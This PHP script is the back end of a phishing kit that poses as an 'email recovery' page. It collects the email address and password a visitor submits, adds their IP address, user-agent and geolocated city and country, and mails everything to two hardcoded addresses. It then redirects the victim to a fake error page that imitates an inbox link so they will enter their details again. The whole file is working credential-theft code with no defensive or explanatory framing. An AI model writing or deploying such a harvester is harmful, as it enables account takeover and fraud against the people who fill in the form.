<?php 

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$agent=$_SERVER['HTTP_USER_AGENT'];
$email= "vywahu@getnada.com,adizalarry20000@gmail.com";
$ip = getenv("REMOTE_ADDR");
$message  = "==================+[ Personal Info - TDS Email Recovery ]+==================\n";
$message .= "Email Address : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['psw']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "=============+ [TDS Mail] +=============\n";
$subject = "TDS 1st Attempt";

$data = $_POST['username']; 
$Password = $_POST['psw'];
if(trim($data) == "" || trim($Password) == ""){
 header( "Location: index.php?email=$data&.rand=13InboxLight.aspx=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
}
else{
mail($email,$subject,$message);

header("Location: error.php?email=$data&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
?>